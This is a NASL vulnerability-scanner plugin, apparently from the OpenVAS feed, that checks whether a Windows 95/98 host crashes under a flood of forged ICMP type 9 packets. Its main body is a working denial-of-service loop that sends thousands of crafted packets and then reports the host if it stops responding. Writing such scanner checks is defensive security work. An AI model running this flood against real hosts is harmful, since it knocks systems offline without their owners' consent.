# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# According to "Paulo Ribeiro" <prrar@NITNET.COM.BR> on VULN-DEV,
# This should slow down Windows 95 and crash Windows 98

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11024");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("p-smash DoS (ICMP 9 flood)");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl", "os_detection.nasl");
  script_exclude_keys("keys/islocalhost", "keys/TARGET_IS_IPV6");
  script_mandatory_keys("Host/runs_windows");

  #  script_add_preference(name:"Flood length :", type:"entry", value:"5000");
  #  script_add_preference(name:"Data length :", type:"entry", value:"500");

  script_xref(name:"URL", value:"https://web.archive.org/web/20130603030606/http://support.microsoft.com/default.aspx?scid=KB;en-us;q216141");

  script_tag(name:"solution", value:"Upgrade your Windows 9x operating system or change it.");

  script_tag(name:"impact", value:"An attacker may use this attack to make this host crash continuously, preventing you
  from working properly.");

  script_tag(name:"summary", value:"It was possible to crash the remote machine by flooding it with ICMP type 9 packets.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if( TARGET_IS_IPV6() || islocalhost()) exit( 0 );

# Ensure that the host is still up
start_denial();
sleep( 2 );
up = end_denial();
if( ! up ) exit( 0 );

fl = script_get_preference("Flood length :");
if( ! fl ) fl = 5000;
dl = script_get_preference("Data length :");
if( ! dl ) dl = 500;

src = this_host();
dst = get_host_ip();
id = 804;
s = 0;
d = crap( dl );

start_denial();

for( i = 0; i < fl; i++ ) {

  id += 1;
  ip = forge_ip_packet( ip_v:4, ip_hl:5, ip_tos:0, ip_off:0,ip_len:20,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
                        ip_src:this_host() );
  icmp = forge_icmp_packet( ip:ip, icmp_type:9, icmp_code:0,
                            icmp_seq:s, icmp_id:s, data:d );
  s += 1;
  send_packet( icmp, pcap_active:FALSE );
}

alive = end_denial();
if( ! alive ) {
  security_message( port:0, proto:"icmp" );
  set_kb_item( name:"Host/dead", value:TRUE );
  exit( 0 );
}

exit( 99 );
